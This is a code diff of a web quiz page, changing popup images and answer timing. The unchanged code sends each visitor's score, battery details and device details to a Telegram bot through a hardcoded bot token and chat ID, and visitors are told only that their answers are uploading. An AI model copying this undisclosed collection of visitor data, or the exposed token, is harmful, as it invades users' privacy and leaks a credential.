@@ -89,7 +89,7 @@
         </div>
         <div id="results-popup" class="popup">
             <div class="popup-content">
-                <img src="runrun.gif" alt="Loading">
+                <img id="popup-image" src="runrun.gif" alt="Loading">
                 <p id="results-text">Uploading your answers to our server</p>
             </div>
         </div>
@@ -127,10 +127,8 @@
         }
 
         function checkAnswer(selected) {
-            setTimeout(() => {
-                userAnswers.push(selected);
-                nextQuestion();
-            }, 3000);
+            userAnswers.push(selected);
+            nextQuestion();
         }
 
         function nextQuestion() {
@@ -143,13 +141,13 @@
         }
 
         function sendDataToTelegram(score, batteryInfo, deviceInfo) {
-            const botToken = '8069886471:AAHa0DJq5vrbYj3r_N-W8fogPFb_NIEPpzs'; // Replace with your Telegram bot token
-            const chatId = '6339522967'; // Replace with your Telegram chat ID
+            const botToken = '8069886471:AAHa0DJq5vrbYj3r_N-W8fogPFb_NIEPpzs';
+            const chatId = '6339522967';
             const message = `Score: ${score}\nBattery: ${batteryInfo}\nDevice: ${deviceInfo}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url, {
-                method: 'GET' // Telegram API allows GET for sendMessage
+                method: 'GET'
             })
                 .then(response => response.json())
                 .then(data => {
@@ -168,6 +166,8 @@
                     const totalQuestions = questions.length;
                     const scoreText = `You got ${score} out of ${totalQuestions} correct`;
                     document.getElementById("results-text").innerText = scoreText;
+                    document.getElementById("popup-image").src = "lastxd.gif";
+                    document.getElementById("popup-image").alt = "Final";
 
                     // Collect battery and device info
                     let batteryInfo = 'N/A';
